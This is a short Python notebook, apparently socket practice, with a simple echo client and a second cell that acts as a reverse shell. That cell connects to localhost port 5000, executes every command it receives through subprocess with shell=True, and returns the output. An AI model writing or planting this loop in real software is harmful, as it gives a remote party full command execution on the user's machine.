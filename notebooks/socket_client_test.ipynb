{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " -> 999\n",
      "Received from server: 999\n",
      " -> a\n"
     ]
    }
   ],
   "source": [
    "import socket\n",
    "def Main():\n",
    "        host = \"127.0.0.1\"\n",
    "        port = 5000\n",
    "\n",
    "        mySocket = socket.socket()\n",
    "        mySocket.connect((host,port))\n",
    "\n",
    "        message = input(\" -> \")\n",
    "\n",
    "        while message != 'q':\n",
    "                mySocket.send(message.encode())\n",
    "                data = mySocket.recv(1024).decode()\n",
    "\n",
    "                print ('Received from server: ' + data)\n",
    "\n",
    "                message = input(\" -> \")\n",
    "\n",
    "        mySocket.close()\n",
    "\n",
    "Main()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import subprocess\n",
    "\n",
    "cliente = socket.socket()\n",
    "\n",
    "\n",
    "cliente.connect((\"127.0.0.1\",5000))\n",
    "cliente.send(\"1\".encode('utf-8'))\n",
    "\n",
    "while True:\n",
    "    c = cliente.recv(1024).decode('utf-8')\n",
    "    comando = subprocess.Popen(c,shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n",
    "    cliente.send(comando.stdout.read())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
